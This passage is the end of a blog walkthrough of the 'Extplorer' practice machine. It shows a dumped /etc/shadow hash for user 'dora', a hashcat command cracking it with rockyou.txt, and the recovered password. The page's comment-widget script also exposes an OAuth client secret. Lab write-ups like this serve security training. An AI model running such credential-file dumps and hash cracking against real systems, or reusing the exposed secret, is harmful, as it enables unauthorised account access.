class="punctuation">:</span></span><br><span class="line">tcpdump<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">landscape<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">pollinate<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19235</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">usbmux<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">sshd<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">systemd-coredump<span class="punctuation">:</span>!!<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">lxd<span class="punctuation">:</span>!<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">fwupd-refresh<span class="punctuation">:</span>*<span class="punctuation">:</span><span class="number">19381</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br><span class="line">dora<span class="punctuation">:</span>$<span class="number">6</span>$PkzB/mtNayFM5eVp$b6LU19HBQaOqbTehc6/LEk8DC2NegpqftuDDAvOK20c6yf3dFo0esC0vOoNWHqvzF0aEb3jxk39sQ/S4vGoGm/<span class="punctuation">:</span><span class="number">19453</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破得到密码 <code>explorer</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat -h |grep &#x27;$<span class="number">6</span>&#x27;</span><br><span class="line">   <span class="number">1800</span> | sha512crypt $<span class="number">6</span>$<span class="punctuation">,</span> SHA512 (Unix)                             | Operating System</span><br><span class="line">  <span class="number">22921</span> | RSA/DSA/EC/OpenSSH Private Keys ($<span class="number">6</span>$)                      | Private Key</span><br><span class="line"></span><br><span class="line">hashcat -m <span class="number">1800</span> root.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
+<li>提权是看到了 dora 有权限 6(disk)， 甚至linpeas中都有黄色背景的利用标识，为什么还是先给忽略了?<br>还是优先尝试自己熟悉的东西，要从最明显的开始</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Yiaos
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://www.thiiiiink.com/post/20250216172300.html" title="Proving Grounds Practice - Extplorer">https://www.thiiiiink.com/post/20250216172300.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/20250216180517.html" rel="prev" title="Proving Grounds Practice - Hub">
+      <i class="fa fa-chevron-left"></i> Proving Grounds Practice - Hub
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/20250216164016.html" rel="next" title="Disk group 提权">
+      Disk group 提权 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Difficuty"><span class="nav-text">Difficuty</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#scans"><span class="nav-text">scans</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#80-wordpress"><span class="nav-text">80 wordpress</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#foodhold"><span class="nav-text">foodhold</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#escalation"><span class="nav-text">escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#diskgroup"><span class="nav-text">diskgroup</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-text">反思</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Yiaos</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yiaos</span>
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23lioxBWzEMyWt1JhD',
+      clientSecret: '6d63e8f9065e954d63e6a90407d40a3ccee85f0e',
+      repo        : 'Yiaos.github.io',
+      owner       : 'Yiaos',
+      admin       : ['Yiaos'],
+      id          : 'af67cfffb078f771d5b82506057947a9',
+        language: 'en',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
